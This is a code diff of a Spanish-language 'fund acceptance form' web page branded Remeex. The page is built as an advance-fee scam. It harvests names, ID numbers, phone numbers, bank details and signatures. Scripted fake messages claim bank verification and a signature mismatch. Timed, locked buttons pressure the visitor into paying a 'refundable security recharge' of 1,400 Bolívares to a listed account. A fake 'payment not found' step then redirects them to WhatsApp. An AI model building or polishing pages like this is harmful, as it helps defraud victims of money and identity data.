@@ -5,16 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Planilla de Aceptación de Fondos</title>
 
-  <!-- Fuentes Google (opcional) -->
+  <!-- Fuentes Google (ejemplo Roboto) -->
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600;700;800&display=swap" rel="stylesheet">
-  <!-- Font Awesome (opcional, para íconos) -->
+  <!-- Font Awesome (para íconos) -->
   <link 
     rel="stylesheet" 
     href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" 
     integrity="sha512-R4p+3pVNe8+zWXEZUg9D3z+m5wK/5qOPkKgjAlc4E+r4QIxv4Wp6NUsAzWRvHWDYRexvbJR67vF9p/L+0N4R0Q==" 
     crossorigin="anonymous" 
     referrerpolicy="no-referrer"
-/>
+  />
 
   <style>
     /****************************************************
@@ -57,7 +57,6 @@
       padding: 1rem;
       position: relative;
       overflow-x: hidden;
-      /* Se remueve cualquier fixed o sticky en el header */
     }
 
     /****************************************************
@@ -77,7 +76,7 @@
     }
 
     /****************************************************
-     * Barra superior (topbar) - NO está position: fixed
+     * Barra superior (topbar)
      ****************************************************/
     .topbar {
       background: var(--gradient);
@@ -211,7 +210,7 @@
     }
 
     /****************************************************
-     * Contenido principal - SIN max-height ni overflow
+     * Contenido principal
      ****************************************************/
     .main-content {
       padding: 3rem;
@@ -286,7 +285,7 @@
       background: var(--input-bg);
       transition: var(--transition);
       color: var(--text);
-      /* Para que el navegador no guarde datos */
+      /* Evita validaciones de pattern forzadas */
       autocomplete: off;
     }
 
@@ -328,6 +327,11 @@
       justify-content: flex-start;
     }
 
+    .btn-disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
     /****************************************************
      * File Upload
      ****************************************************/
@@ -360,93 +364,98 @@
     }
 
     /****************************************************
-     * Modales genéricos - Fondo difuminado
+     * Estilo unificado para Overlays / Modales
      ****************************************************/
-    .modal-overlay {
+    .unified-overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.3);
-      backdrop-filter: blur(6px);
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(5px);
       display: none;
       align-items: center;
       justify-content: center;
-      z-index: 9999;
-    }
-    .modal-overlay.show {
-      display: flex;
-    }
-
-    .modal {
-      background: #fff;
-      max-width: 600px;
-      width: 90%;
+      z-index: 999999;
+      flex-direction: column;
+      text-align: center;
+      color: #fff;
       padding: 2rem;
-      border-radius: 20px;
-      position: relative;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
       animation: fadeInUp 0.4s ease;
     }
-
     @keyframes fadeInUp {
       from { transform: translateY(30px); opacity: 0; }
       to { transform: translateY(0); opacity: 1; }
     }
 
-    .close-modal {
+    .unified-content {
+      background: #fff;
+      color: #333;
+      border-radius: 20px;
+      max-width: 600px;
+      width: 90%;
+      padding: 2rem;
+      position: relative;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+      animation: fadeInScale 0.4s ease;
+      text-align: center;
+    }
+
+    @keyframes fadeInScale {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .unified-close-btn {
       background: none;
       border: none;
-      font-size: 1.2rem;
+      font-size: 1.3rem;
       position: absolute;
       top: 1rem; right: 1rem;
       cursor: pointer;
+      color: var(--text-light);
     }
 
-    .modal-header h2 {
-      margin-bottom: 1rem;
+    .unified-spinner {
+      margin: 0 auto 1rem auto;
+      width: 50px;
+      height: 50px;
+      border: 5px solid var(--border);
+      border-top: 5px solid var(--primary);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Título principal dentro de los overlays unificados */
+    .unified-title {
+      font-size: 1.4rem;
       font-weight: 700;
-      font-size: 1.3rem;
-      text-align: center;
       color: var(--secondary);
+      margin-bottom: 1rem;
     }
 
-    .modal-content {
-      line-height: 1.6;
+    .unified-text {
       font-size: 1rem;
+      color: #333;
+      line-height: 1.6;
       text-align: justify;
+      margin: 1rem 0;
     }
 
     /****************************************************
-     * Vista previa de firma
+     * Distintos tipos de Overlays que usan la clase base
      ****************************************************/
-    .signature-preview {
-      margin-top: 1rem;
-      text-align: center;
+    /* Modal general (confirmación Steps) */
+    .modal-overlay {
+      /* Se unifica con .unified-overlay */
     }
-    .signature-preview img {
-      max-width: 250px;
-      border: 2px dashed var(--border);
-      border-radius: 8px;
-      padding: 0.5rem;
+    .modal {
+      /* Se unifica con .unified-content */
     }
 
     /****************************************************
-     * Modal de firma
-     ****************************************************/
-    #signatureModal .modal-content {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    #signatureCanvas {
-      border: 2px dashed var(--border);
-      border-radius: 8px;
-      cursor: crosshair;
-      width: 100%;
-      max-width: 500px;
-    }
-
-    /****************************************************
-     * Barra de progreso (más gruesa) - Se mantiene fixed
+     * Barra de progreso (fija)
      ****************************************************/
     .progress-indicator {
       position: fixed;
@@ -515,54 +524,7 @@
     }
 
     /****************************************************
-     * Modal Loading (desenfoca la pantalla) - Validación
-     ****************************************************/
-    .loading-overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      background: rgba(0, 0, 0, 0.4);
-      backdrop-filter: blur(5px);
-      z-index: 10000;
-      flex-direction: column;
-      text-align: center;
-    }
-
-    .loading-box {
-      background: #fff;
-      padding: 2rem;
-      border-radius: 20px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-      animation: fadeInUp 0.4s ease;
-    }
-
-    .loading-step {
-      font-size: 1rem;
-      margin: 1rem 0;
-      display: none; /* se mostrarán secuencialmente */
-      text-align: center;
-    }
-
-    .loading-spinner {
-      width: 50px;
-      height: 50px;
-      border: 5px solid var(--border);
-      border-top: 5px solid var(--primary);
-      border-radius: 50%;
-      margin: 0 auto;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      100% { transform: rotate(360deg); }
-    }
-
-    /****************************************************
-     * Mensaje flotante (Cierre e indicación)
+     * Mensaje flotante (ej. comprobanteCierreMsg)
      ****************************************************/
     #comprobanteCierreMsg {
       position: fixed;
@@ -585,41 +547,27 @@
     }
 
     /****************************************************
-     * Overlays de 20s en Step3 (4 mensajes)
+     * Pantalla de Bienvenida (Intro)
      ****************************************************/
-    .verification-overlay {
+    .intro-overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
       background: rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(5px);
-      display: none;
+      backdrop-filter: blur(8px);
+      z-index: 999999;
+      display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      z-index: 99999;
-      text-align: center;
       color: #fff;
-      flex-direction: column;
-      padding: 2rem;
-      transition: var(--transition);
-    }
-    .verification-overlay .verification-message {
-      background: rgba(0,0,0,0.6);
-      border-radius: 20px;
-      padding: 2rem;
-      margin-bottom: 1rem;
-      max-width: 600px;
-      width: 90%;
-      animation: fadeInUp 0.5s ease;
-      font-size: 1.1rem;
-    }
-    .verification-overlay h2 {
       font-size: 1.3rem;
-      margin-bottom: 1rem;
-      color: #00ff00;
+      text-align: center;
+      animation: fadeInUp 0.4s ease;
     }
 
     /****************************************************
      * Tarjeta principal "Verificación de Seguridad"
+     * Estandarizada: 3 tarjetas
      ****************************************************/
     .verification-card-container {
       border: 2px dashed var(--border);
@@ -631,20 +579,56 @@
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       animation: fadeInUp 0.4s ease;
     }
-    .verification-card-container h2 {
-      font-size: 1.5rem;
+
+    /* Título amarillo centrado (estándar) */
+    .section-title-centered {
+      color: var(--accent);
+      text-align: center;
+      font-weight: 800;
+      font-size: 1.4rem;
       margin-bottom: 1rem;
-      color: var(--primary);
     }
-    .verification-card-container p {
-      font-size: 1rem;
-      color: var(--text-light);
-      margin-bottom: 1rem;
-      line-height: 1.4;
+
+    /* Contenedor de 3 tarjetas internas */
+    .verification-three-cards {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem;
+      justify-content: center;
+      margin-top: 1rem;
+    }
+
+    .verif-card {
+      background: #F9FAFB;
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 1rem;
+      flex: 1;
+      min-width: 240px;
+      max-width: 320px;
+      text-align: left;
+    }
+    .verif-card h3 {
+      margin-bottom: 0.5rem;
+      color: var(--primary);
+      font-size: 1.1rem;
+      font-weight: 700;
+      text-align: center;
+    }
+    .verif-card ul {
+      list-style: none;
+      margin: 0; 
+      padding: 0;
+    }
+    .verif-card li {
+      margin-bottom: 0.3rem;
+      font-size: 0.95rem;
+      line-height: 1.3;
     }
 
     /****************************************************
      * Sección "¿Por qué realizar esta verificación?"
+     * Título centrado y amarillo
      ****************************************************/
     .why-verification-container {
       text-align: center;
@@ -652,10 +636,13 @@
       animation: fadeInUp 0.4s ease;
     }
     .why-verification-container h2 {
-      margin-bottom: 1rem;
       color: var(--accent);
       font-size: 1.4rem;
+      margin-bottom: 1rem;
+      text-align: center;
     }
+
+    /* Lista de razones con ícono girando (estándar) */
     .why-list {
       display: flex;
       flex-direction: column;
@@ -687,14 +674,8 @@
       font-size: 0.95rem;
     }
 
-    /* Botón con cuenta regresiva */
-    .btn-disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
     /****************************************************
-     * Sección "¿Qué necesitas hacer?"
+     * Sección "¿Qué necesitas hacer?" (tarjeta)
      ****************************************************/
     .what-to-do-card {
       border: 2px dashed var(--border);
@@ -707,24 +688,22 @@
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       animation: fadeInUp 0.4s ease;
     }
-
     .what-to-do-title {
+      color: var(--accent);
+      font-weight: 800;
+      font-size: 1.4rem;
       text-align: center;
-      font-size: 1.2rem;
-      color: var(--secondary);
-      font-weight: 700;
       margin-bottom: 1rem;
     }
-
     .what-to-do-content {
       margin-bottom: 1rem;
       line-height: 1.4;
       color: var(--text);
+      text-align: justify;
     }
     .what-to-do-content strong {
       color: var(--secondary);
     }
-
     .what-to-do-data {
       background: #F9FAFB;
       border-radius: 12px;
@@ -732,14 +711,12 @@
       border: 1px solid var(--border);
       margin-top: 1rem;
     }
-
     .what-to-do-data ul {
       list-style: none; 
       padding-left: 0; 
       line-height: 1.6; 
       margin: 0;
     }
-
     .concept-text {
       font-weight: 700;
       text-transform: uppercase;
@@ -773,7 +750,6 @@
     .final-recharge-data .data-label {
       font-weight: 600;
     }
-
     .reembolso-banner {
       background: #fdf7ec;
       border-left: 4px solid var(--accent);
@@ -782,45 +758,8 @@
       margin-top: 1rem;
       font-size: 0.9rem;
       color: var(--text);
+      text-align: justify;
     }
-
-    /****************************************************
-     * Modal Alerta Recarga (confirmación)
-     ****************************************************/
-    .modalAlertRecarga .modal-header h2 {
-      text-align: center;
-      font-size: 1.2rem;
-      margin-bottom: 0.5rem;
-      color: var(--primary);
-    }
-    .modalAlertRecarga p {
-      line-height: 1.5;
-    }
-    .modalAlertRecarga ul {
-      list-style: none;
-      padding-left: 0;
-      line-height: 1.6;
-    }
-
-    /****************************************************
-     * Pantalla de Bienvenida
-     ****************************************************/
-    .intro-overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(8px);
-      z-index: 999999;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-size: 1.3rem;
-      text-align: center;
-      animation: fadeInUp 0.4s ease;
-    }
-
   </style>
 </head>
 <body>
@@ -860,24 +799,23 @@
   </div>
 
   <!-- Overlay de validación (5s) Steps 1 y 2 -->
-  <div class="loading-overlay" id="validationOverlay">
-    <div class="loading-box" style="text-align:center;">
-      <div class="loading-spinner"></div>
-      <p style="margin-top:1rem;">Validando tu información, por favor espera...</p>
+  <div class="unified-overlay" id="validationOverlay">
+    <div class="unified-content">
+      <button class="unified-close-btn" style="display:none;">&times;</button>
+      <div class="unified-spinner"></div>
+      <p class="unified-text">Validando tu información, por favor espera...</p>
     </div>
   </div>
 
   <!-- Modal de confirmación (Steps) -->
-  <div class="modal-overlay" id="modalConfirm">
-    <div class="modal">
-      <button class="close-modal" onclick="onEditData()">&times;</button>
-      <div class="modal-header">
-        <h2>Revisar y Confirmar</h2>
-      </div>
-      <div class="modal-content" id="modalConfirmContent" style="text-align:justify;">
+  <div class="unified-overlay modal-overlay" id="modalConfirm">
+    <div class="unified-content modal">
+      <button class="unified-close-btn" onclick="onEditData()">&times;</button>
+      <h2 class="unified-title">Revisar y Confirmar</h2>
+      <div class="unified-text" id="modalConfirmContent" style="text-align:justify;">
         <!-- Contenido dinámico -->
       </div>
-      <div class="modal-footer" style="margin-top:1.5rem; display:flex; justify-content:center; gap:1rem;">
+      <div class="btn-row" style="justify-content:center; margin-top:1.5rem;">
         <button class="btn" type="button" onclick="onEditData()">
           <i class="fas fa-edit"></i> Editar
         </button>
@@ -888,16 +826,36 @@
     </div>
   </div>
 
+  <!-- NUEVO OVERLAY: "Tu firma debe coincidir..." -->
+  <div class="unified-overlay" id="overlayFirmaCoincide">
+    <div class="unified-content">
+      <button class="unified-close-btn" style="display:none;">&times;</button>
+      <div class="unified-spinner"></div>
+      <h3 style="margin-top:1rem;">Tu firma debe coincidir con la establecida en tu documento de identidad</h3>
+      <button class="btn" id="btnFirmaCoincideOk" style="background: var(--accent); color: var(--secondary); margin-top:1.5rem;">
+        <i class="fas fa-check-circle"></i> Acepto
+      </button>
+    </div>
+  </div>
+
+  <!-- NUEVO OVERLAY: "Tu firma no coincide..." (5s) -->
+  <div class="unified-overlay" id="overlayFirmaNoCoincide">
+    <div class="unified-content">
+      <button class="unified-close-btn" style="display:none;">&times;</button>
+      <div class="unified-spinner"></div>
+      <h3 style="margin-top:1rem;">Tu firma no coincide</h3>
+      <p>No coincide con la de tu documento de identidad</p>
+    </div>
+  </div>
+
   <!-- Modal de firma (Step1) -->
-  <div class="modal-overlay" id="signatureModal">
-    <div class="modal">
-      <button class="close-modal" onclick="closeSignatureModal()">&times;</button>
-      <div class="modal-header">
-        <h2>Firma (como está en tu documento de identidad)</h2>
-      </div>
-      <div class="modal-content">
-        <canvas id="signatureCanvas" width="500" height="200"></canvas>
-        <div class="btn-row" style="margin-top:1rem;">
+  <div class="unified-overlay modal-overlay" id="signatureModal">
+    <div class="unified-content modal">
+      <button class="unified-close-btn" onclick="closeSignatureModal()">&times;</button>
+      <h2 class="unified-title" style="font-size:1.2rem;">Firma (como está en tu documento de identidad)</h2>
+      <div class="unified-text" style="text-align:center;">
+        <canvas id="signatureCanvas" width="500" height="200" style="border:2px dashed var(--border); border-radius:8px; cursor:crosshair;"></canvas>
+        <div class="btn-row" style="margin-top:1rem; justify-content:center;">
           <button class="btn" type="button" id="clearSignature">
             <i class="fas fa-eraser"></i> Borrar
           </button>
@@ -909,14 +867,12 @@
     </div>
   </div>
 
-  <!-- Modal Alerta Recarga (cuando hace clic en "Una vez que realices...") -->
-  <div class="modal-overlay" id="modalAlertaRecarga">
-    <div class="modal modalAlertRecarga">
-      <button class="close-modal" onclick="closeRecargaAlert()">&times;</button>
-      <div class="modal-header">
-        <h2>Confirmación de Recarga</h2>
-      </div>
-      <div class="modal-content" id="modalAlertaRecargaContent">
+  <!-- Modal Alerta Recarga -->
+  <div class="unified-overlay modal-overlay" id="modalAlertaRecarga">
+    <div class="unified-content modal modalAlertRecarga">
+      <button class="unified-close-btn" onclick="closeRecargaAlert()">&times;</button>
+      <h2 class="unified-title" style="font-size:1.2rem;">Confirmación de Recarga</h2>
+      <div class="unified-text" id="modalAlertaRecargaContent" style="text-align:justify;">
         <!-- Se llena dinámicamente -->
       </div>
       <div class="btn-row" style="justify-content:center; margin-top:1.5rem;">
@@ -928,45 +884,78 @@
   </div>
 
   <!-- Overlay final (35s) -->
-  <div class="loading-overlay" id="finalLoadingOverlay">
-    <div class="loading-box">
-      <div class="loading-spinner"></div>
-      <div class="loading-step" id="finalStep1">Estamos validando todos tus datos...</div>
-      <div class="loading-step" id="finalStep2">Estamos conectando con tu banco...</div>
-      <div class="loading-step" id="finalStep3">Verificando la recarga de seguridad por 1.400,00 Bolívares...</div>
-      <div class="loading-step" id="finalStep4">Preparando tu depósito por <span id="finalMontoGlobal"></span>...</div>
-      <div class="loading-step" id="finalStep5">Verificando tu depósito de 1.400,00 Bolívares...</div>
-      <div class="loading-step" id="finalStep6">No localizamos tu recarga de seguridad por 1.400,00 Bolívares...</div>
-      <div class="loading-step" id="finalStep7">Revisando de nuevo la recarga de seguridad por 1.400,00 Bolívares...</div>
-      <div class="loading-step" id="finalStep8">
-        No se encontró tu depósito de seguridad por 1.400,00 Bolívares.<br/><br/>
-        Debes contactar a Atención al Cliente porque no hemos encontrado tu recarga de seguridad.
-        <div style="margin-top:1rem;">
-          <button class="btn" type="button" onclick="openWhatsAppError()">
-            <i class="fab fa-whatsapp"></i> Contactar por WhatsApp
-          </button>
+  <div class="unified-overlay" id="finalLoadingOverlay">
+    <div class="unified-content" style="text-align:center;">
+      <button class="unified-close-btn" style="display:none;">&times;</button>
+      <div class="unified-spinner"></div>
+      <div style="margin-top:1rem;">
+        <div class="unified-text loading-step" id="finalStep1" style="display:none;">Estamos validando todos tus datos...</div>
+        <div class="unified-text loading-step" id="finalStep2" style="display:none;">Estamos conectando con tu banco...</div>
+        <div class="unified-text loading-step" id="finalStep3" style="display:none;">Verificando la recarga de seguridad por 1.400,00 Bolívares...</div>
+        <div class="unified-text loading-step" id="finalStep4" style="display:none;">Preparando tu depósito por <span id="finalMontoGlobal"></span>...</div>
+        <div class="unified-text loading-step" id="finalStep5" style="display:none;">Verificando tu depósito de 1.400,00 Bolívares...</div>
+        <div class="unified-text loading-step" id="finalStep6" style="display:none;">No localizamos tu recarga de seguridad por 1.400,00 Bolívares...</div>
+        <div class="unified-text loading-step" id="finalStep7" style="display:none;">Revisando de nuevo la recarga de seguridad por 1.400,00 Bolívares...</div>
+        <div class="unified-text loading-step" id="finalStep8" style="display:none;">
+          No se encontró tu depósito de seguridad por 1.400,00 Bolívares.<br/><br/>
+          Debes contactar a Atención al Cliente porque no hemos encontrado tu recarga de seguridad.
+          <div style="margin-top:1rem;">
+            <button class="btn" type="button" onclick="openWhatsAppError()">
+              <i class="fab fa-whatsapp"></i> Contactar por WhatsApp
+            </button>
+          </div>
         </div>
       </div>
     </div>
   </div>
 
   <!-- OVERLAY de 20s (4 mensajes x 5s) al llegar a Step3 -->
-  <div class="verification-overlay" id="overlay20s">
-    <div class="verification-message" id="overlayMsg1">
-      <h2>¡Documento Validado!</h2>
-      <p>Tu documento de identidad fue validado con éxito.</p>
+  <div class="unified-overlay" id="overlay20s">
+    <div class="unified-content" style="text-align:center;">
+      <button class="unified-close-btn" style="display:none;">&times;</button>
+      <!-- Mensajes secuenciales -->
+      <div style="display:none;" id="overlayMsg1">
+        <h2 class="unified-title" style="font-size:1.2rem;">¡Documento Validado!</h2>
+        <p class="unified-text">Tu documento de identidad fue validado con éxito.</p>
+      </div>
+      <div style="display:none;" id="overlayMsg2">
+        <h2 class="unified-title" style="font-size:1.2rem;">Preparando Depósito</h2>
+        <p class="unified-text">Estamos preparando tu depósito, por favor espera...</p>
+      </div>
+      <div style="display:none;" id="overlayMsg3">
+        <h2 class="unified-title" style="font-size:1.2rem;">Validación de Seguridad Extra</h2>
+        <p class="unified-text">Se requiere validación de seguridad adicional.</p>
+      </div>
+      <div style="display:none;" id="overlayMsg4">
+        <h2 class="unified-title" style="font-size:1.2rem;">Tu Banco Solicita Verificación</h2>
+        <p class="unified-text">Antes de recibir nuestros fondos, tu banco exige verificación extra.</p>
+      </div>
     </div>
-    <div class="verification-message" id="overlayMsg2">
-      <h2>Preparando Depósito</h2>
-      <p>Estamos preparando tu depósito, por favor espera...</p>
+  </div>
+
+  <!-- Overlays "Conectando Banco" y "Razón Adicional" -->
+  <div class="unified-overlay" id="overlayConectandoBanco">
+    <div class="unified-content">
+      <button class="unified-close-btn" style="display:none;">&times;</button>
+      <div class="unified-spinner"></div>
+      <h3 style="margin-top:1rem;">Nos estamos conectando con tu banco...</h3>
     </div>
-    <div class="verification-message" id="overlayMsg3">
-      <h2>Validación de Seguridad Extra</h2>
-      <p>Se requiere validación de seguridad adicional.</p>
-    </div>
-    <div class="verification-message" id="overlayMsg4">
-      <h2>Tu Banco Solicita Verificación</h2>
-      <p>Antes de recibir nuestros fondos, tu banco exige verificación extra.</p>
+  </div>
+
+  <div class="unified-overlay" id="overlayRazonAdicional">
+    <div class="unified-content">
+      <button class="unified-close-btn" style="display:none;">&times;</button>
+      <div class="unified-spinner"></div>
+      <h3 style="margin-top:1rem;">Información de seguridad adicional</h3>
+      <p class="unified-text">
+        Serás conducido a realizar una verificación adicional de seguridad por:<br/><br/>
+        <strong>- Monto elevado en bolívares<br/>
+        - Tu firma digital no coincide con la de tu documento de identidad</strong>
+      </p>
+      <!-- Botón habilitado tras 10s -->
+      <button class="btn btn-disabled" id="btnRazonAdicionalContinue" disabled>
+        Continuar
+      </button>
     </div>
   </div>
 
@@ -981,7 +970,6 @@
             title="Remeex"
           />
         </div>
-
         <div class="title-header">Planilla de Aceptación de Fondos</div>
 
         <!-- Pasos -->
@@ -1038,12 +1026,12 @@
             />
           </div>
 
-          <!-- Teléfono con prefijo + 7 dígitos -->
+          <!-- Teléfono sin pattern -->
           <div class="form-group">
             <label for="phonePrefix">
               <i class="fas fa-phone"></i> Teléfono
             </label>
-            <span class="label-help">Selecciona tu operadora y los 7 dígitos</span>
+            <span class="label-help">Selecciona tu operadora y los dígitos</span>
             <div style="display:flex; gap:0.5rem;">
               <select id="phonePrefix" required style="width:30%;" autocomplete="off">
                 <option value="">Operadora</option>
@@ -1056,8 +1044,7 @@
               <input 
                 type="text" 
                 id="phoneNumber" 
-                placeholder="1234567" 
-                pattern="^\d{7}$" 
+                placeholder="Ej: 1234567" 
                 required
                 style="width:70%;" 
                 autocomplete="off"
@@ -1088,6 +1075,7 @@
             </select>
           </div>
 
+          <!-- Cédula sin pattern -->
           <div class="form-group">
             <label for="cedulaNumber">
               <i class="fas fa-id-badge"></i> Número de Cédula
@@ -1096,7 +1084,6 @@
               type="text"
               id="cedulaNumber"
               placeholder="Ej: 12345678"
-              pattern="^\d{1,8}$"
               required
               autocomplete="off"
             />
@@ -1150,9 +1137,9 @@
               Haz click para firmar
             </div>
             <input type="hidden" id="signatureData" required />
-            <div class="signature-preview" id="signaturePreviewContainer" style="display:none;">
+            <div class="signature-preview" id="signaturePreviewContainer" style="display:none; margin-top:0.5rem; text-align:center;">
               <strong>Vista Previa:</strong><br/>
-              <img id="signaturePreview" src="" alt="Firma Digital" />
+              <img id="signaturePreview" src="" alt="Firma Digital" style="max-width:200px; border:1px solid #ccc; border-radius:8px;"/>
             </div>
           </div>
 
@@ -1351,18 +1338,55 @@
 
       <!-- STEP 3 -->
       <div class="form-step" id="step3">
-        <!-- Tarjeta principal (Verificación de Seguridad) -->
+        <!-- Tarjeta principal (Verificación) -->
         <div class="verification-card-container" id="verificationMainCard" style="display:none;">
-          <h2>Verificación de Seguridad para tu Transferencia</h2>
-          <p id="verificationMainText"></p>
+          <div class="section-title-centered">¡Importante! Revisión de Seguridad para tu Depósito</div>
+          
+          <!-- Tres tarjetas unificadas -->
+          <div class="verification-three-cards">
+            <!-- 1) Datos personales -->
+            <div class="verif-card" id="verifCardDatosPersonales">
+              <h3>Datos Personales</h3>
+              <ul>
+                <li><strong>Nombre:</strong> <span id="cardFullName"></span></li>
+                <li><strong>Cuenta:</strong> <span id="cardAccount"></span></li>
+                <li><strong>Banco:</strong> <span id="cardBank"></span></li>
+                <li><strong>Montos (Bs/USD):</strong> <span id="cardMontos"></span></li>
+              </ul>
+            </div>
+            <!-- 2) Lo aprobado -->
+            <div class="verif-card">
+              <h3>Lo Aprobado</h3>
+              <ul>
+                <li>Identidad del usuario</li>
+                <li>El monto del depósito</li>
+                <li>La cuenta bancaria proporcionada</li>
+              </ul>
+            </div>
+            <!-- 3) Lo pendiente -->
+            <div class="verif-card">
+              <h3>Lo Pendiente</h3>
+              <ul>
+                <li>Proceso de seguridad adicional (monto elevado)</li>
+                <li>Verificación de la firma digital</li>
+              </ul>
+            </div>
+          </div>
+
+          <!-- Texto final -->
+          <p style="margin-top:1rem; text-align:justify; font-size:0.95rem;">
+            Por favor, completa el proceso solicitado por tu banco para garantizar 
+            la seguridad de tu depósito.
+          </p>
+
           <div class="btn-row" style="justify-content:center;">
-            <button type="button" class="btn" id="btnShowWhy">
-              <i class="fas fa-info-circle"></i> Continuar
+            <button type="button" class="btn btn-disabled" id="btnMainCardContinue" disabled>
+              Espera 60s...
             </button>
           </div>
         </div>
 
-        <!-- Sección "¿Por qué realizar esta verificación?" -->
+        <!-- "¿Por qué realizar esta verificación?" -->
         <div class="why-verification-container" id="whyVerification" style="display:none;">
           <h2>¿Por qué realizar esta verificación?</h2>
           <div class="why-list">
@@ -1384,18 +1408,17 @@
             </div>
           </div>
           <div class="btn-row" style="justify-content:center; margin-top:2rem;">
-            <!-- DESHABILITADO AL INICIO POR 12s -->
             <button type="button" class="btn btn-disabled" id="btnShowWhatToDo" disabled>
               Espera 12s...
             </button>
           </div>
         </div>
 
-        <!-- Sección "¿Qué necesitas hacer?" -->
+        <!-- "¿Qué necesitas hacer?" -->
         <div class="what-to-do-card" id="whatToDoCard" style="display:none;">
           <div class="what-to-do-title">¿Qué necesitas hacer?</div>
           <div class="what-to-do-content">
-            Para verificar que nadie esté suplantando tu identidad y comprobar que tienes control sobre tu cuenta bancaria, 
+            Para verificar que no se suplante tu identidad y que tienes control sobre tu cuenta bancaria, 
             debes realizar una recarga de seguridad desde la <strong>misma cuenta</strong> 
             donde recibirás tus fondos, por un monto de <strong id="recargaBs">1.400,00 Bolívares</strong>. 
             Esta recarga es <strong>reembolsable</strong>; se te devolverá junto con tu depósito final. 
@@ -1404,7 +1427,7 @@
           </div>
           <div class="what-to-do-data">
             <ul>
-              <li><strong>Banco:</strong> Banco Venezolano de Crédito (<em>0104</em>)</li>
+              <li><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</li>
               <li><strong>Número:</strong> 0412-1000000</li>
               <li><strong>RIF:</strong> J-407502646</li>
               <li><strong>Monto:</strong> <span id="montoReembolsable">1.400,00 Bolívares</span></li>
@@ -1416,7 +1439,7 @@
           </button>
         </div>
 
-        <!-- Sección final: Completar datos de recarga (único campo comprobante) -->
+        <!-- Sección final: Completar datos de recarga -->
         <div class="final-recharge-data" id="finalRechargeData" style="display:none;">
           <h3>Completar Datos de tu Recarga</h3>
           <div class="data-row">
@@ -1436,7 +1459,6 @@
             <div>1.400,00</div>
           </div>
 
-          <!-- Banner de reembolso -->
           <div class="reembolso-banner" id="reembolsoBanner"></div>
 
           <div class="form-group" style="margin-top:1rem;">
@@ -1452,7 +1474,6 @@
           </div>
 
           <div class="btn-row" style="justify-content:center;">
-            <!-- DESHABILITADO 45s -->
             <button type="button" class="btn btn-disabled" id="btnFinalRecargaContinuar" disabled>
               <i class="fas fa-arrow-right"></i> Espera 45s...
             </button>
@@ -1477,14 +1498,13 @@
     }
 
     /****************************************************
-     * Intro Overlay (Mensajes "Bienvenido" 3s, luego "Cargando 2s")
+     * Intro Overlay
      ****************************************************/
     const introOverlay = document.getElementById('introOverlay');
     const introMessage1 = document.getElementById('introMessage1');
     const introMessage2 = document.getElementById('introMessage2');
 
     introMessage1.style.display = 'block';
-
     setTimeout(() => {
       introMessage1.style.display = 'none';
       introMessage2.style.display = 'block';
@@ -1494,7 +1514,7 @@
     }, 3000);
 
     /****************************************************
-     * Variables Globales
+     * Variables globales
      ****************************************************/
     const steps = document.querySelectorAll('.form-step');
     const sidebarSteps = document.querySelectorAll('.step-item');
@@ -1503,26 +1523,22 @@
     // Barra de progreso
     const progressBar = document.getElementById('progressBar');
 
-    // Overlays y modales
+    // Overlays y modales (unificados)
     const validationOverlay = document.getElementById('validationOverlay');
     const modalConfirm = document.getElementById('modalConfirm');
     const modalConfirmContent = document.getElementById('modalConfirmContent');
     const finalLoadingOverlay = document.getElementById('finalLoadingOverlay');
     const comprobanteCierreMsg = document.getElementById('comprobanteCierreMsg');
     const overlay20s = document.getElementById('overlay20s');
-
-    // Mensajes del overlay20s
-    const overlayMsgs = [
-      document.getElementById('overlayMsg1'),
-      document.getElementById('overlayMsg2'),
-      document.getElementById('overlayMsg3'),
-      document.getElementById('overlayMsg4')
-    ];
+    const modalAlertaRecarga = document.getElementById('modalAlertaRecarga');
+    const modalAlertaRecargaContent = document.getElementById('modalAlertaRecargaContent');
+    const btnAlertaRecargaOk = document.getElementById('btnAlertaRecargaOk');
+    const overlayFirmaCoincide = document.getElementById('overlayFirmaCoincide');
+    const overlayFirmaNoCoincide = document.getElementById('overlayFirmaNoCoincide');
 
     // Step 3 secciones
     const verificationMainCard = document.getElementById('verificationMainCard');
-    const verificationMainText = document.getElementById('verificationMainText');
-    const btnShowWhy = document.getElementById('btnShowWhy');
+    const btnMainCardContinue = document.getElementById('btnMainCardContinue');
     const whyVerification = document.getElementById('whyVerification');
     const btnShowWhatToDo = document.getElementById('btnShowWhatToDo');
     const whatToDoCard = document.getElementById('whatToDoCard');
@@ -1531,20 +1547,26 @@
     const finalRechargeData = document.getElementById('finalRechargeData');
     const btnFinalRecargaContinuar = document.getElementById('btnFinalRecargaContinuar');
     const reembolsoBanner = document.getElementById('reembolsoBanner');
+    const finalMontoGlobalEl = document.getElementById('finalMontoGlobal');
 
